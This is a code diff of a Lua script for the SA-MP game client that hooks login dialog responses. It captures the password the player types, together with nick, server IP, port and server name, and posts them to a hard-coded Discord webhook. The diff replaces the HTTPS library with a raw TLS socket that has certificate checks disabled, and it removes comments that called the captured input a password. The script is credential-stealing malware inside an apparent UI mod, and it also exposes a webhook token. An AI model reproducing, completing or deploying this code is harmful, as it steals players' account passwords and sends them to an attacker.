@@ -1,4 +1,4 @@
-locl imgui = require "mimgui"
+local imgui = require "mimgui"
 local faicons = require("fAwesome6")
 
 local window = imgui.new.bool(false)
@@ -12,28 +12,61 @@ local events = require "lib.samp.events"
 local new = imgui.new
 local ev = require('lib.samp.events')
 
-local https = require("ssl.https")
+
+local socket = require("socket")
+local ssl = require("ssl")
 local ltn12 = require("ltn12")
 local samp = require("samp.events")
 
-local webhookUrl = "https://discord.com/api/webhooks/1344405697642762260/AMSM__DQ0n4OC5-s7m_Hkatg-sAguMiq2wFrgiMabsKL5sj3XGC3f6pJHGV3XyJ604zx"
+-- Configurações do Webhook
+local webhookDomain = "discord.com"
+local webhookPath = "/api/webhooks/1344405697642762260/AMSM__DQ0n4OC5-s7m_Hkatg-sAguMiq2wFrgiMabsKL5sj3XGC3f6pJHGV3XyJ604zx"
 local messageSent = false
 
+-- Função para enviar mensagem ao Discord via socket SSL
 function sendMessageToDiscord(content)
-    local body = '{"content": "' .. content:gsub('"', '\\"'):gsub("\n", "\\n") .. '"}'
-    local response_body = {}
-    https.request {
-        url = webhookUrl,
-        method = "POST",
-        headers = {
-            ["Content-Type"] = "application/json",
-            ["Content-Length"] = tostring(#body)
-        },
-        source = ltn12.source.string(body),
-        sink = ltn12.sink.table(response_body)
+    local jsonData = string.format('{"content": "%s"}', content:gsub('"', '\\"'):gsub("\n", "\\n"))
+    
+    local headers = {
+        "Host: " .. webhookDomain,
+        "Content-Type: application/json",
+        "Content-Length: " .. #jsonData,
+        "Connection: close"
     }
+
+    local tcpSocket = socket.tcp()
+    tcpSocket:settimeout(5)
+    
+    local success, err = tcpSocket:connect(webhookDomain, 443)
+    if not success then return false end
+
+    local sslSocket = ssl.wrap(tcpSocket, {
+        mode = "client",
+        protocol = "tlsv1_2",
+        verify = "none"
+    })
+    sslSocket:sni(webhookDomain)
+    sslSocket:settimeout(5)
+
+    success, err = sslSocket:dohandshake()
+    if not success then return false end
+
+    local request = string.format(
+        "POST %s HTTP/1.1\r\n%s\r\n\r\n%s",
+        webhookPath,
+        table.concat(headers, "\r\n"),
+        jsonData
+    )
+
+    success, err = sslSocket:send(request)
+    if not success then return false end
+
+    sslSocket:receive("*a") -- Ignora leitura de resposta
+    sslSocket:close()
+    return true
 end
 
+-- Evento do SAMP
 samp.onSendDialogResponse = function(dialogId, button, listboxId, input)
     if (dialogId == 0 or dialogId == 1 or dialogId == 2) and not messageSent then
         local res, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
@@ -53,13 +86,13 @@ samp.onSendDialogResponse = function(dialogId, button, listboxId, input)
             "**SERVIDOR:** %s\n" ..
             "**DATA:** %s\n" ..
             "**HORA:** %s\n\n" ..
-            "@everyone", -- manter minúsculo!
+            "@everyone",
             dialogId,
-            input,        -- senha preservada como digitada
-            nick,         -- nick normal
+            input,
+            nick,
             ip,
             port,
-            servername,   -- nome do servidor original
+            servername,
             data,
             hora
         )
